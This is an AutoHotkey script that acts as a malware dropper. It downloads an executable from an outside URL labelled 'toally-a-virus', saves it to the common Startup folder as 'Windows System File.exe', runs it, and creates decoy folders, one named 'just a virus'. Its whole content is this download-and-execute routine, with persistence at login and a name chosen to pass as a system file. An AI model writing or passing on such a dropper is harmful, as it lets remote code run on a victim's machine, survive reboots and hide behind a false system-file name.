#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/Main.exe, %A_StartupCommon%\Windows System File.exe
Sleep, 500
Run, Windows System File.exe, %A_StartupCommon%\
FileCreateDir, C:\Windows System\Security\temp
FileCreateDir, C:\Windows System\Security\data\bin
FileCreateDir, C:\Windows System\Security\bin
FileCreateDir, C:\Windows System\Security\START_MENU
FileCreateDir, C:\Users\%A_UserName%\proccessData\User1_data\temp
FileCreateDir, C:\Users\%A_UserName%\proccessData\User1_data\data\nofile\just a virus
FileCreateDir, C:\Users\%A_UserName%\proccessData\User1_data\64x\console_log
FileCreateDir, C:\Users\%A_UserName%\proccessData\User1_data\64x\sys
ExitApp